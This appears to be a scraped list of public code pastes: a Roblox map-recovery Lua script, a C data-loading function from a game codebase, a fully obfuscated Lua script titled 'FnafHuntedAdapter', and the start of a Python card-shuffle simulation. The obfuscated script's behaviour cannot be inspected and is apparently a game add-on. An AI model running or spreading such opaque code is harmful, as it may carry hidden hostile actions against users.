	if autosaveFolder then
		-- Look for any scripts inside the folder that might be responsible for autosaving
		for _, child in ipairs(autosaveFolder:GetChildren()) do
			if child:IsA(""Script"") or child:IsA(""ModuleScript"") then
				child:Destroy()
				print(""Disabled autosave script: "" .. child:GetFullName())
			end
		end
		print(""All autosave scripts in 'autosave v5 fix 2' have been disabled."")
	else
		warn(""Autosave folder 'autosave v5 fix 2' not found"")
	end
end

-- First recover the metadata to know how many chunks we need to recover
local metadataStore = DataStoreService:GetDataStore(""GlobalMapStore_Meta"")
local listSuccess, metaPages = pcall(function()
	return metadataStore:ListVersionsAsync(""MapMetadata"", nil, time.UnixTimestampMillis)
end)

if listSuccess then
	local metaItems = metaPages:GetCurrentPage()
	if #metaItems > 0 then
		local metaVersion = metaItems[1].Version
		local success, metadata
		success, metadata = pcall(function()
			return metadataStore:GetVersionAsync(""MapMetadata"", metaVersion)
		end)
		if success and metadata then
			print(""Found map metadata from "" .. os.date(""%Y-%m-%d %H:%M:%S"", metadata.lastSaveTime))
			print(""Total chunks: "" .. metadata.totalChunks)
			-- Restore the metadata first
			metadataStore:SetAsync(""MapMetadata"", metadata)
			-- Now restore each chunk from each datastore
			local totalChunks = metadata.totalChunks
			local chunksRestored = 0
			local datastoreIndex = 1
			while datastoreIndex <= 200 and chunksRestored < totalChunks do
				local currentStore = DataStoreService:GetDataStore(""GlobalMapStore"" .. datastoreIndex)
				for i = 1, math.min(5, totalChunks - chunksRestored) do
					local chunkIndex = chunksRestored + 1
					if chunkIndex > totalChunks then break end
					local chunkKey = ""GlobalMap_Chunk"" .. chunkIndex
					local listSuccess, chunkPages = pcall(function()
						return currentStore:ListVersionsAsync(chunkKey, nil, time.UnixTimestampMillis)
					end)
					if listSuccess then
						local chunkItems = chunkPages:GetCurrentPage()
						if #chunkItems > 0 then
							local chunkVersion = chunkItems[1].Version
							local chunkSuccess, chunkData
							chunkSuccess, chunkData = pcall(function()
								return currentStore:GetVersionAsync(chunkKey, chunkVersion)
							end)
							if chunkSuccess and chunkData then
								currentStore:SetAsync(chunkKey, chunkData)
								print(""Restored chunk "" .. chunkIndex .. "" from GlobalMapStore"" .. datastoreIndex)
								chunksRestored = chunksRestored + 1
							else
								warn(""Failed to restore chunk "" .. chunkIndex)
							end
						else
							warn(""No version found for chunk "" .. chunkIndex)
						end
					else
						warn(""Failed to list versions for chunk "" .. chunkIndex)
					end
				end
				datastoreIndex = datastoreIndex + 1
			end
			print(""Map restoration complete! Restored "" .. chunksRestored .. "" of "" .. totalChunks .. "" chunks."")
			print(""Restart the server to load the recovered map."")
		else
			warn(""Failed to retrieve metadata version"")
		end
	else
		warn(""No metadata versions found before the specified time"")
	end
else
	warn(""Failed to list metadata versions"")
end

-- Disable the autosave script after recovery
disableAutosave()"
zBe959ws,Untitled,Kurausukun,C,Saturday 26th of July 2025 09:13:26 PM CDT,"MUSICAL_DISTRIBUTE_DATA* MUSICAL_SYSTEM_InitDistributeData( HEAPID workHeapId )
{
  MUSICAL_DISTRIBUTE_DATA *distData = GFL_HEAP_AllocMemory( workHeapId , sizeof( MUSICAL_DISTRIBUTE_DATA ) );

  distData->programData = NULL;
  distData->messageData = NULL;
  distData->scriptData = NULL;
  distData->midiData = NULL;
  distData->midiSeqData = NULL;
  distData->midiBnkData = NULL;
  distData->midiWaveData = NULL;

  return distData;
}

void MUSICAL_SYSTEM_TermDistributeData( MUSICAL_DISTRIBUTE_DATA *distData )
{
  if( distData->programData != NULL )
  {
    GFL_HEAP_FreeMemory( distData->programData );
  }
  if( distData->messageData != NULL )
  {
    GFL_HEAP_FreeMemory( distData->messageData );
  }
  if( distData->scriptData != NULL )
  {
    GFL_HEAP_FreeMemory( distData->scriptData );
  }
  //Seq・Bnk・Waveはパックしてある
  if( distData->midiData != NULL )
  {
    GFL_HEAP_FreeMemory( distData->midiData );
  }

  GFL_HEAP_FreeMemory( distData );
}

void MUSICAL_SYSTEM_LoadDistributeData( MUSICAL_DISTRIBUTE_DATA *distData , SAVE_CONTROL_WORK *saveWork , GAMEDATA *gamedata, const u8 programNo , HEAPID heapId )
{
  ARCHANDLE *arcHandle;
  MUSICAL_DIST_SAVE *distSave;
  MUS_DIST_MIDI_HEADER midiSizeHeader;
  MUS_DIST_MIDI_HEADER *pMidiSizeHeader;
  distData->programNo = programNo;
  if( programNo >= MUS_PROGRAM_LOCAL_NUM )
  {
    void *musArc;
    u32 arcSize;
    distSave = MUSICAL_DIST_SAVE_LoadData( gamedata , heapId );
    musArc = MUSICAL_DIST_SAVE_GetMusicalArc( distSave );
    arcSize = MUSICAL_DIST_SAVE_GetMusicalArcSize( distSave );
    arcHandle = GFL_ARC_OpenDataHandleByMemory( musArc , arcSize , GFL_HEAP_LOWID(heapId) );
  }
  else
  {
    arcHandle = GFL_ARC_OpenDataHandle( ARCID_MUSICAL_PROGRAM_01+programNo , GFL_HEAP_LOWID(heapId) );
  }
  distData->programData = GFL_ARCHDL_UTIL_LoadEx( arcHandle , MUSICAL_ARCDATAID_PROGDATA , FALSE , heapId , &distData->programDataSize );
  distData->messageData = GFL_ARCHDL_UTIL_LoadEx( arcHandle , MUSICAL_ARCDATAID_GMMDATA , FALSE , heapId , &distData->messageDataSize );
  distData->scriptData = GFL_ARCHDL_UTIL_LoadEx( arcHandle , MUSICAL_ARCDATAID_SCRIPTDATA , FALSE , heapId , &distData->scriptDataSize );

  midiSizeHeader.seqSize  = GFL_ARC_GetDataSizeByHandle( arcHandle , MUSICAL_ARCDATAID_SSEQDATA );
  midiSizeHeader.bankSize = GFL_ARC_GetDataSizeByHandle( arcHandle , MUSICAL_ARCDATAID_SBNKDATA );
  midiSizeHeader.waveSize = GFL_ARC_GetDataSizeByHandle( arcHandle , MUSICAL_ARCDATAID_SWAVDATA );
  
  distData->midiDataSize = sizeof(MUS_DIST_MIDI_HEADER) + midiSizeHeader.seqSize + midiSizeHeader.bankSize + midiSizeHeader.waveSize;
  
  distData->midiData = GFL_HEAP_AllocClearMemory( heapId , distData->midiDataSize );
  
  pMidiSizeHeader = distData->midiData;
  distData->midiSeqData  = (void*)((u32)distData->midiData + sizeof(MUS_DIST_MIDI_HEADER));
  distData->midiBnkData  = (void*)((u32)distData->midiData + sizeof(MUS_DIST_MIDI_HEADER) + midiSizeHeader.seqSize );
  distData->midiWaveData = (void*)((u32)distData->midiData + sizeof(MUS_DIST_MIDI_HEADER) + midiSizeHeader.seqSize + midiSizeHeader.bankSize );
  
  pMidiSizeHeader->seqSize  = midiSizeHeader.seqSize;
  pMidiSizeHeader->bankSize = midiSizeHeader.bankSize;
  pMidiSizeHeader->waveSize = midiSizeHeader.waveSize;
  
  GFL_ARC_LoadDataByHandle( arcHandle , MUSICAL_ARCDATAID_SSEQDATA , distData->midiSeqData );
  GFL_ARC_LoadDataByHandle( arcHandle , MUSICAL_ARCDATAID_SBNKDATA , distData->midiBnkData );
  GFL_ARC_LoadDataByHandle( arcHandle , MUSICAL_ARCDATAID_SWAVDATA , distData->midiWaveData );
  
  GFL_ARC_CloseDataHandle( arcHandle );
  if( programNo >= MUS_PROGRAM_LOCAL_NUM )
  {
    MUSICAL_DIST_SAVE_UnloadData( distSave );
  }

  MUS_TPrintf(""MusicalSystem LoadMidiData[%d][%d][%d].\n"",pMidiSizeHeader->seqSize,pMidiSizeHeader->bankSize,pMidiSizeHeader->waveSize);
}"
tncUV1Xm,FnafHuntedAdapter,FinderYT,Lua,Saturday 26th of July 2025 08:07:34 PM CDT,"return(function(...)local u={""\116\077\073\108\103\077\090\061"";""\109\083\054\043\088\083\070\101\118\075\048\082\079\074\118\055\052\081\107\061"";""\116\077\069\067\116\080\082\070\103\074\065\061"";""\103\087\086\061"";""\049\101\069\068\079\104\061\061"",""\116\077\069\105\116\071\101\108\050\049\086\061"";""\049\101\069\070\103\074\118\115\119\100\061\061"";""\050\083\073\106\050\099\061\061"";""\065\074\088\106\103\075\050\115"";""\065\080\118\051\079\068\070\120\047\088\088\074\119\107\073\101\047\089\100\061"",""\048\101\057\050\116\073\116\107\118\074\076\061"";""\050\075\048\101\079\076\061\061"",""\052\073\100\083\047\073\048\071\047\073\085\067\047\090\050\105"",""\072\077\069\105\072\067\048\107\090\077\106\122\116\075\070\075\099\101\121\061"";""\103\071\073\084\047\100\061\061"";""\118\107\118\090\088\073\050\077\047\083\118\105\072\089\086\084\118\107\065\061"",""\079\083\085\085\065\076\061\061"";""\085\088\119\112\057\109\117\089\081\110\066\048\087\103\089\083\097\049\057\080\119\083\072\081\112\089\088\114\103\066\114\116\083\118\098\061"",""\109\073\048\082\088\090\088\049\065\077\115\073\048\083\106\088"";""\103\087\055\061"";""\109\080\118\084\065\055\116\115\116\100\061\061"",""\088\083\088\074\071\115\073\047\050\077\073\077\119\107\073\078\109\100\061\061"";""\120\089\079\083\077\090\085\105\084\102\074\105\097\104\061\061"",""\085\116\054\073\048\068\104\117\043\070\055\103\100\072\052\088\110\050\090\079\047\057\087\099\117\081\115\090\105\101\107\116\084\080\074\057\111\089\080\108\076\051\081\077"",""\118\083\088\084\090\083\088\097\116\074\115\089\050\099\061\061"";""\116\071\111\104\079\071\048\078"";""\104\047\085\083\098\109\076\102"";""\116\074\111\080\109\100\061\061"",""\047\055\069\055\118\087\085\087\047\084\069\054\081\068\116\047"",""\103\077\088\105"",""\065\077\048\085\103\077\104\061"";""\103\077\069\085\050\080\048\084\065\074\115\105\050\104\061\061"";""\088\077\073\106\065\077\088\097\086\055\118\115\116\077\088\089\116\077\088\107\086\099\061\061"",""\052\076\061\061"";""\065\074\073\105\050\077\069\106"","""",""\065\075\118\097\047\071\111\068"",""\118\073\057\079\119\088\088\067\050\049\088\102\116\090\107\084\071\107\086\061"",""\050\049\082\097\103\075\086\061"",""\118\081\082\083\071\077\048\075\109\074\118\057\072\074\073\104\099\115\055\061"";""\050\074\056\051\103\075\086\061"";""\114\083\054\066\065\068\054\115\121\066\072\061"";""\079\067\115\074\052\088\086\061"",""\099\115\085\077\118\077\106\105\071\090\088\079\048\077\107\061"";""\049\101\069\054\050\071\043\061"",""\052\108\076\115\050\122\121\070\052\076\061\061"";""\049\101\069\106\050\049\118\085\116\077\073\108\103\077\090\061"",""\065\083\088\084\103\071\088\084\079\049\118\085\079\074\056\115"";""\079\083\069\105\079\083\073\084"";""\079\068\115\084\050\099\061\061"",""\087\053\080\115\071\098\049\083\066\114\109\054\120\100\085\065\113\050\053\107\117\099\061\061"";""\070\078\099\114\111\084\121\103"",""\090\083\088\084\099\083\069\097\050\099\061\061"";""\109\054\099\070\111\107\055\061"";""\050\083\101\085\116\077\048\121"";""\074\085\120\101\117\100\061\061"",""\088\089\086\075\088\089\076\084\072\083\104\056\065\090\115\106\118\076\061\061""}local function R(R)return u[R-(995181+-951179)]end for R,d in ipairs({{761713-761712;-12355-(-12412)};{147448+-147447,-140173+140215},{-157308-(-157351);-235952-(-236009)}})do while d[402675-402674]<d[-280557-(-280559)]do u[d[-756695-(-756696)]],u[d[968102+-968100]],d[-1026157+1026158],d[136192-136190]=u[d[370934+-370932]],u[d[-296784+296785]],d[919610-919609]+(11069-11068),d[-227184+227186]-(-250194+250195)end end do local R=table.concat local d=string.sub local q=string.char local i={G=-174887-(-174909),v=401102-401085,q=715730+-715667;c=-39645+39661,P=954696+-954689;b=555287-555227;L=-380556-(-380588),V=-762867-(-762875);F=874236-874195,[""\048""]=-346437-(-346450),o=996308+-996251;N=1028607-1028564;[""\047""]=1025536-1025510,S=513932-513878;l=70062+-70028;[""\049""]=-111321-(-111344);D=-696426+696465,t=-191760-(-191789),z=70286+-70284;X=-199599+199620;J=-207751+207789;Q=1011091-1011072,k=435140+-435104,I=45189-45184,W=-337774-(-337777);[""\053""]=-268145-(-268204),w=-476478-(-476508),p=982788-982726;[""\051""]=-803987-(-804034),K=-178983-(-179038),u=900753-900711;[""\043""]=646987+-646931,j=680899+-680854,[""\054""]=285245+-285201;[""\050""]=134461-134436,e=-712211-(-712264),h=192003-191955,M=315509-315503,[""\055""]=638821+-638817,Z=869992-869972;Y=947142+-947107;O=89764+-89740,[""\057""]=626947+-626946,E=-230841+230902,m=-444512-(-444530);C=436186-436135;[""\056""]=-964736+964785;n=735367-735352,A=370188-370160,f=-534430+534441,[""\052""]=5118+-5104,d=-943419+943419;y=-541837-(-541877),r=16666-16608;R=-30203-(-30212),a=689007-688957,T=-603523-(-603575);U=-158604-(-158637);x=732229-732219,H=585969-585957;g=-418848-(-418875);B=421040+-421009;s=-541652-(-541689);i=586715-586669}local o=table.insert local l=u local T=type local g=math.floor local t=string.len for u=311351-311350,#l,-764091+764092 do local O=l[u]if T(O)==""\115\116\114\105\110\103""then local T=t(O)local v={}local x=472810+-472809 local W=136303-136303 local S=-146754-(-146754)while x<=T do local u=d(O,x,x)local R=i[u]if R then W=W+R*(-849623+849687)^((650380-650377)-S)S=S+(54795-54794)if S==580950-580946 then S=605378+-605378 local u=g(W/(-949681+1015217))local R=g((W%(-776401-(-841937)))/(95612-95356))local d=W%(637097+-636841)o(v,q(u,R,d))W=373422+-373422 end elseif u==""\061""then o(v,q(g(W/(23341-(-42195)))))if x>=T or d(O,x+(543182-543181),x+(-474072-(-474073)))~=""\061""then o(v,q(g((W%(-479408-(-544944)))/(92337-92081))))end break end x=x+(-755290-(-755291))end l[u]=R(v)end end end return(function(u,q,i,o,l,T,g,S,Y,P,J,x,v,k,t,O,w,d,W,X,Q)Y,P,J,t,d,k,v,Q,S,W,x,w,O,X=function(u)O[u]=O[u]-(272177-272176)if 432153+-432153==O[u]then O[u],t[u]=nil,nil end end,function(u,R)local q=W(R)local i=function(i,o,l,T)return d(u,{i,o,l;T},R,q)end return i end,function(u,R)local q=W(R)local i=function(i,o,l,T,g)return d(u,{i;o;l,T;g},R,q)end return i end,{},function(d,i,o,l)local I,e,p,h,W,c,F,H,f,A,U,S,s,V,m,G,j,g,y,E,C,O,D,n,M,a,Q,K,N,Z,L,B,x,r while d do if d<1021793+6899093 then if d<3273087-(-331662)then if d<319366+1470587 then if d<1019939+-120662 then if d<528399+-138995 then if d<66340-(-101294)then if d<-598117-(-687847)then d=U g=D d=D and 4794569-(-143111)or-551430+13206259 else c=R(539911-495887)L=U m=u[c]c=R(-801351+845388)N=m[c]m=N(O,L)N=t[o[802573-802567]]c=N()j=m+c d=-90994+12430166 C=j+V c=-194210+194211 j=-498871+499127 F=C%j L=nil V=F j=W[x]m=V+c N=S[m]C=j..N W[x]=C end else c=-203501+203502 K=-416442-(-416448)d=t[f]m=d(c,K)K=R(-14949+58997)d=R(-379481-(-423529))u[d]=m c=u[K]K=363791+-363789 d=c>K d=d and-41540+6716781 or 6037338-(-368903)end else if d<-326286+960777 then r=134884+-134883 t[x]=n e=t[H]h=e+r B=I[h]A=a+B B=-1040859+1041115 d=A%B h=t[Z]a=d B=p+h h=-281495+281751 A=B%h d=-353026+10058888 p=A else x=R(-531585-(-575600))W=13433785-883738 g=13969048-(-861878)O=x^W d=g-O O=d g=R(-757013-(-801043))d=g/O g={d}d=u[R(-586269+630327)]end end else if d<2078970-664005 then if d<316677-(-1048276)then if d<1108615-(-30248)then d=-171298+7113777 else Z=not E j=j+s C=j<=K C=Z and C Z=j>=K Z=E and Z C=Z or C Z=797808+10253629 d=C and Z C=-794593+15005914 d=d or C end else V=nil f=nil S=nil d=2974378-(-484220)end else if d<792785+924239 then W=R(-861217-(-905262))x=u[W]W=R(1081519-1037466)O=x[W]d=u[R(324464-280448)]W=t[o[-615080+615081]]x={O(W)}g={q(x)}else x=t[o[852377+-852374]]W=177212+-177105 d=956128+14934171 O=x*W x=-994269+994526 g=O%x t[o[22350-22347]]=g end end end else if d<271784+2930166 then if d<2527716-(-55471)then if d<-272807+2688430 then if d<2977100-788657 then d=-869583-(-876276)F=R(392860+-348815)p=u[F]F=R(-675575+719588)a=p[F]D=a else d=1654874-(-975703)e=417754+-417752 h=I[e]e=t[M]B=h==e n=B end else O=i[406107-406106]d=t[o[178913-178912]]W=d x=i[-423607-(-423609)]d=W[x]d=d and 7702997-578305 or-229868+15774543 end else if d<2369328-(-269107)then g=n d=A d=627516+12627785 else d=529054+15298285 O=nil t[o[354478+-354473]]=g end end else if d<2461403-(-958698)then if d<2832540-(-518581)then d=true d=d and 9918276-1028999 or 3140022-(-275061)else d=w(1336452-309732,{S})m={d()}g={q(m)}d=u[R(899774-855720)]end else if d<3038655-(-515968)then g={x}d=u[R(-840272-(-884316))]else W=W+Q x=W<=S f=not V x=f and x f=W>=S f=V and f x=f or x f=1008146+7400608 d=x and f x=16916439-965690 d=d or x end end end end else if d<1014348+5173131 then if d<4991631-235263 then if d<-933796+4881629 then if d<3615538-(-277335)then if d<249929+3599522 then O=R(565384+-521358)d=u[O]x=t[o[1031025-1031017]]W=507879-507879 O=d(x,W)d=871395+11477979 else L=R(489+43556)V=g f=R(-121199+165258)g=u[f]f=R(-299678+343700)d=g[f]f=v()t[f]=d g=u[L]L=R(-811309-(-855345))d=g[L]U=d L=d p=R(660382-616337)a=u[p]D=a d=a and 365225+1457084 or 745796-739103 end else t[x]=N d=t[x]d=d and 211037+12092279 or 299633+9089430 end else if d<4814938-441816 then d=513808-(-846101)j=Y(j)S=Y(S)L=nil F=nil C=nil a=nil f=Y(f)p=nil U=Y(U)L=R(9403-(-34642))D=Y(D)Q=Y(Q)f=R(-418259+462318)V=nil W=Y(W)x=Y(x)x=nil V=R(-540628-(-584687))C=938150-938149 W=nil Q=u[V]a={}V=R(-87952+131980)p=v()S=Q[V]U=v()Q=v()F={}t[Q]=S D=R(136237-92213)V=u[f]f=R(-255401+299423)S=V[f]f=u[L]L=R(137433+-93380)V=f[L]L=u[D]D=R(-415527+459531)j=765465-765209 f=L[D]D=v()K=j j=726429+-726428 s=j L=158611+-158611 t[D]=L L=-524060+524062 t[U]=L L={}j=-968090+968090 t[p]=a E=s<j a=-341297-(-341297)j=C-s else x=t[o[635330+-635329]]S=-935327+935328 Q=930282-930280 W=x(S,Q)x=-6462+6463 O=W==x d=O and 500694+10608726 or 8350334-46212 g=O end end else if d<294290+5628441 then if d<-825149+6677588 then if d<6026216-756780 then D=v()U=172776+-172773 t[D]=g a=522666-522601 C=P(-231145+874091,{})d=t[f]g=d(U,a)d=132226-132226 F=R(-1012939+1056957)a=d d=151214-151214 U=v()p=d t[U]=g g=u[F]F={g(C)}d={q(F)}F=d g=860360-860358 d=F[g]c=R(-441719+485766)g=R(-45421+89471)C=d d=u[g]j=t[W]m=u[c]c=m(C)m=R(-25996+70029)N=j(c,m)j={N()}g=d(q(j))j=v()t[j]=g g=-236421-(-236422)N=t[U]d=15735012-(-452255)m=N N=-166001+166002 c=N N=79553+-79553 K=c<N N=g-c else m=a==p N=m d=3154495-(-740066)end else a=-800117+800130 W=230244-230212 D=34571-34569 x=t[o[-18968+18971]]O=x%W S=t[o[698088+-698084]]f=t[o[-826389-(-826391)]]C=t[o[858971+-858968]]F=C-O C=648868-648836 d=395620+1163440 p=F/C U=a-p L=D^U V=f/L Q=S(V)S=4294597752-(-369544)W=Q%S L=1033790-1033789 D=150660+-150404 a=515608-515352 Q=535576-535574 S=Q^O x=W/S S=t[o[-471458+471462]]f=x%L L=4294413571-(-553725)V=f*L Q=S(V)S=t[o[-554119+554123]]V=S(x)W=Q+V f=710820-645284 Q=-796453+861989 O=nil S=W%Q V=W-S Q=V/f f=-616621+616877 V=S%f L=S-V f=L/D W=nil D=210403+-210147 S=nil L=Q%D U=Q-L D=U/a Q=nil U={V;f;L;D}V=nil x=nil L=nil D=nil f=nil t[o[865004+-865003]]=U end else if d<5163174-(-815542)then g=R(-976723+1020749)O=R(-149136+193156)d=u[g]g=d(O)g={}d=u[R(-281242+325267)]else j=#F K=628188-628188 C=j==K d=C and-798901+13820306 or 13971014-981877 end end end else if d<-883566+7552986 then if d<755471+5810248 then if d<7204669-753066 then if d<760747+5584195 then g={}x=nil d=u[R(-568686-(-612732))]W=nil else K=R(860021+-815973)d=u[K]K=R(726652+-682645)u[K]=d d=8079865-(-364779)end else m=t[x]N=m d=m and 5503243-(-298787)or 4495468-600907 end else if d<-402926+7027423 then d=true t[o[189476-189475]]=d g={}d=u[R(378698-334689)]else D=20948437074130-678584 d=775410+5435278 U=R(-289992-(-334033))Q=R(-628802+672854)S=u[Q]L=R(-886017+930027)f=x(L,D)Q=R(392756-348744)Q=S[Q]V=W[f]a=-645761+19548407594511 Q=Q(S,V)D=582535481655-(-784344)L=R(582534+-538496)f=x(L,D)V=W[f]p=-893807+33755143626965 D=x(U,a)a=R(-458404+502418)F=34771427388537-716090 L=W[D]U=x(a,p)C=615712+28780035804985 p=R(-669737-(-713780))D=W[U]a=x(p,F)F=R(78523-34518)U=W[a]S=R(938942-894902)j=18516402062621-(-695441)p=x(F,C)a=W[p]C=R(-542687+586716)S=Q[S]F=x(C,j)p=W[F]F=511630-511615 f={[L]=D,[U]=a,[p]=F}S=S(Q,V,f)end end else if d<6311014-(-636901)then if d<415798+6274705 then c=R(-388397-(-432444))d=u[c]s=R(-259186-(-303193))K=u[s]c=d(K)d=R(312580+-268532)u[d]=c d=-651122+9095766 else d=true d=d and 15614478-745730 or 51544+15768272 end else if d<7241465-83601 then d=-443731+3902329 else f=R(-111468-(-155520))Q=R(-665382+709401)S=u[Q]a=-887052+28349926849693 U=R(-577343+621354)V=u[f]D=x(U,a)L=W[D]D=R(-390646-(-434654))D=V[D]f={D(V,L)}Q=S(q(f))d=-274621+6485309 S=Q()end end end end end else if d<13549091-584409 then if d<10701417-306914 then if d<8815169-289289 then if d<-846768+9256835 then if d<-142361+8538448 then if d<72501+8238176 then x=t[o[-454213+454215]]d=-528401+11637821 W=t[o[-765227+765230]]O=x==W g=O else B=-922953+922954 A=I[B]n=A d=-274154-(-885575)end else x=W D=-1034299-(-1034554)d=t[o[-557576+557577]]L=807710+-807710 f=d(L,D)O[x]=f x=nil d=-210858+3797890 end else if d<9193140-755691 then n=t[x]g=n d=n and 13390115-503569 or 12528310-(-726991)else d=9843936-(-467141)end end else if d<10319015-712348 then if d<9955196-532037 then if d<-557570+9794210 then d=337720+9973357 else d=true d=1014797+2400286 end else x=R(-510495+554550)W=12388689-(-997752)O=x^W g=1003684+15036825 d=g-O O=d g=R(61328+-17297)d=g/O g={d}d=u[R(-335279-(-379336))]end else if d<9348309-(-749549)then d=986081+15201186 s=Y(s)Z=Y(Z)E=Y(E)I=nil G=Y(G)H=Y(H)M=Y(M)else d=true d=d and 33649-(-202378)or-481947+15407053 end end end else if d<12313543-(-4630)then if d<132848+10980698 then if d<322357+10780860 then if d<11102636-99445 then d=true x=v()S=v()W=R(718448+-674424)Q=v()O=i t[x]=d g=u[W]W=R(828216-784174)d=g[W]W=v()t[W]=d d=P(195018+5730156,{})t[S]=d d=false L=X(7441367-838129,{Q})f=R(-972653+1016671)t[Q]=d V=u[f]f=V(L)d=f and-777312+15938843 or-517296+4410072 g=f else C=j Z=C F[C]=Z C=nil d=368967+990942 end else d=g and-854243+15146484 or 990387+14836952 end else if d<11191125-(-633865)then A=t[x]n=A d=A and 7300714-(-1021689)or-697064+1308485 else d=5074294-832743 end end else if d<12434839-(-203839)then if d<516714+11828635 then U=U+a F=not p L=U<=D L=F and L F=U>=D F=p and F L=F or L F=41316+86051 d=L and F L=-148946+1547859 d=d or L else d={}W=t[o[290374+-290365]]O=d x=785827+-785826 S=W W=262831+-262830 Q=W W=-804377-(-804377)V=Q<W W=x-Q d=-903649+4490681 end else if d<12842629-(-23893)then d=522720+4414960 U=R(-93195+137208)D=u[U]g=D else e=-133141+133142 A=d h=I[e]e=false B=h==e d=B and 282305+1918546 or 3422228-791651 n=B end end end end else if d<14725719-(-480361)then if d<361656+13956924 then if d<-303227+13842850 then if d<12732469-(-493484)then if d<13365555-356280 then j=-1006958-(-1006959)K=#F C=S(j,K)Z=670025+-670024 d=272030+5907904 j=V(F,C)K=t[p]E=j-Z s=f(E)C=nil K[j]=s j=nil else C={}E=R(-263880+307915)V=nil Z={}j=v()f=nil s=v()I=R(-720399-(-764433))B=nil G=R(425724-381673)a=nil t[j]=C C=v()K=J(719188+16011237,{j,D,U;Q})t[C]=K K={}t[s]=K F=nil f=R(-857471-(-901523))K=u[E]M=t[s]H={[G]=M;[I]=B}E=K(Z,H)Q=Y(Q)S=nil K=k(1780547-(-736576),{s,j;p,D;U;C})D=Y(D)p=Y(p)L=nil W=E D=R(-62356+106395)V=u[f]x=K U=Y(U)U=20082450691717-823806 s=Y(s)C=Y(C)j=Y(j)L=x(D,U)f=W[L]Q=V[f]V=6859104721-515649 S=Q==V d=S and-537829+8283660 or 7545857-884424 end else t[x]=g d=-27270+9733132 end else if d<-249194+14541013 then K=-186298+186298 j=#F C=j==K d=12236484-(-752653)else g=R(-225006-(-269056))d=u[g]L=R(-158643+202661)S=R(-589225-(-633272))D=P(9438063-(-55671),{})O=t[o[348609+-348605]]W=u[S]f=u[L]L={f(D)}V={q(L)}f=-1039078+1039080 Q=V[f]S=W(Q)W=R(824816+-780783)x=O(S,W)O={x()}g=d(q(O))x=t[o[-69267+69272]]O=g g=x d=x and 15696613-508826 or-791669+3963122 end end else if d<458058+14584264 then if d<14740328-(-145926)then g=R(690124+-646076)d=u[g]O=R(294472-250465)g=u[O]O=R(709233+-665226)u[O]=d O=R(639233-595185)u[O]=g O=t[o[-893370+893371]]d=875233+6067246 x=O()else d=u[R(-835663-(-879669))]g={}end else if d<74535+15096451 then V=t[Q]d=-67734+3960510 g=V else W=t[o[-965514-(-965520)]]d=648578+2522875 x=W==O g=x end end end else if d<16701475-779402 then if d<15419113-(-403470)then if d<16255941-597501 then if d<14876304-(-433622)then s=v()M=342372-342371 H=-159913-(-160168)t[s]=N E=R(-477184+521243)r=-131262-(-131262)Z=118116-118016 g=u[E]E=R(865228+-821206)d=g[E]E=835726-835725 g=d(E,Z)E=v()Z=406669+-406669 t[E]=g d=t[f]g=d(Z,H)Z=v()t[Z]=g d=t[f]G=t[E]H=925701-925700 I=-252910-(-252912)g=d(H,G)H=v()t[H]=g B=R(17989-(-26058))g=t[f]G=g(M,I)g=41898+-41897 I=R(-229515-(-273536))d=G==g G=v()t[G]=d A=u[B]y=-12611-(-22611)d=R(776069-732013)d=C[d]g=R(276538+-232505)h=t[f]e={h(r,y)}B=A(q(e))A=R(-559160-(-603181))n=B..A M=I..n d=d(C,g,M)M=v()n=P(3915531-(-740576),{f;s;U,W,x,j;G;M;E;H,Z;D})t[M]=d I=R(-61259+105277)g=u[I]I={g(n)}d={q(I)}I=d d=t[G]d=d and 7559360-(-862762)or 11199035-80296 else f=86791-86536 L=R(-351478-(-395502))U=358656+-358655 d={}Q=35184372446949-358117 t[o[908455+-908453]]=d g=t[o[-460693+460696]]S=g g=x%Q t[o[-564804+564808]]=g V=x%f f=-856574-(-856576)Q=V+f a=U t[o[699312+-699307]]=Q f=u[L]U=661220-661220 L=R(-75797+119814)V=f[L]f=V(O)d=-935506+13274678 V=R(-115096+159119)D=f p=a<U W[x]=V V=-1029267+1029444 L=-376137+376138 U=L-a end else g={}d=u[R(-690891+734894)]end else if d<15711118-(-149279)then d=t[o[538878-538871]]d=d and 698089+2932040 or 11785670-(-563704)else W=897334+-897333 x=t[o[138794-138791]]O=x~=W d=O and-460402+6376933 or 1973042-187013 end end else if d<16782218-689761 then if d<886434+15064985 then d=t[o[-1023473-(-1023483)]]x=t[o[492860+-492849]]O[d]=x d=t[o[808826-808814]]x={d(O)}d=u[R(-846081-(-890108))]g={q(x)}else x=t[o[-83075-(-83077)]]W=77975+-77958 O=x*W x=393251+30387377469218 g=O+x O=-242769+35184372331601 d=g%O t[o[-841636+841638]]=d x=415420-415419 O=t[o[-967207-(-967210)]]g=O~=x d=2523587-737558 end else if d<16822678-429899 then N=N+c s=not K g=N<=m g=s and g s=N>=m s=K and s g=s or g s=15462769-247448 d=g and s g=7065708-586451 d=d or g else O=t[o[38598-38597]]g=#O O=90413+-90413 d=g==O d=d and 14939824-(-1012661)or 1365099-(-193961)end end end end end end end d=#l return q(g)end,function(u,R)local q=W(R)local i=function(i,o,l)return d(u,{i,o,l},R,q)end return i end,function()x=(125438+-125437)+x O[x]=280675-280674 return x end,function(u,R)local q=W(R)local i=function(...)return d(u,{...},R,q)end return i end,function(u)local R,d=-168453+168454,u[430778+-430777]while d do O[d],R=O[d]-(-518571+518572),(261966+-261965)+R if O[d]==-537123-(-537123)then O[d],t[d]=nil,nil end d=u[R]end end,function(u)for R=936230-936229,#u,215283-215282 do O[u[R]]=O[u[R]]+(197672-197671)end if i then local d=i(true)local q=l(d)q[R(187214+-143163)],q[R(-759126+803175)],q[R(898443-854411)]=u,S,function()return-528631+-180015 end return d else return o({},{[R(-139932-(-183981))]=S,[R(701509-657458)]=u;[R(-527140+571172)]=function()return-661928+-46718 end})end end,150883-150883,function(u,R)local q=W(R)local i=function()return d(u,{},R,q)end return i end,{},function(u,R)local q=W(R)local i=function(i,o)return d(u,{i,o},R,q)end return i end return(Q(88879+10752425,{}))(q(g))end)(getfenv and getfenv()or _ENV,unpack or table[R(109603+-65590)],newproxy,setmetatable,getmetatable,select,{...})end)(...)"
ksKHJY43,MTG/RiffleShuffle Simulation,Notze,Python,Saturday 26th of July 2025 07:50:53 PM CDT,"# Script to simulate a riffle shuffle (adapted to fit Magic The Gathering: Commander decks)

import random

# the maximum difference of stack sizes (in number of cards) when splitting the deck
splitting_deviation_in_cards = 5

# the probability of mistakes during the merging of the two card stacks 
# range 0 to 1 where 0 means the shuffle is perfectly executed, always taking exactly one card from each stack
# and 1 resulting in a 50% chance to get a card from the same stack as before
merging_randomness = 0.05

# similar to 'merging_randomness' but only applies to the first card when merging two stacks and is either random or not
first_card_is_always_from_left_stack = False

# how many time the deck shall be shuffled
